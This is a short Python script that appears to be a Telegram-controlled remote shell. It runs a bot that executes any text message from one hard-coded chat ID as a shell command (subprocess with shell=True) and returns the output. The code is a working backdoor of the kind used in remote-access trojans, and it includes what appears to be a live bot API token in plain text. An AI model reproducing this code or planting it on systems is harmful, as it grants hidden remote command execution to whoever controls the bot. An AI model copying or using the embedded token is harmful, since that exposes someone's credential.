import telebot
import subprocess

bot = telebot.TeleBot("6546639466:AAEXAwjNzWBaSXbZhZ0BngKqgxPHEkuDz4s")
owner_id = 6690748705

@bot.message_handler(content_types=["text"])
def input_command(message):
   if (owner_id == message.chat.id):
      command = message.text
      try:
         process = subprocess.run([command], capture_output=True, shell=True, text="True")
         bot.send_message(message.chat.id, process.stdout)
      except:
         bot.send_message(message.chat.id, "Команда введена неверно")

while True:
   bot.polling(none_stop=True, interval=0)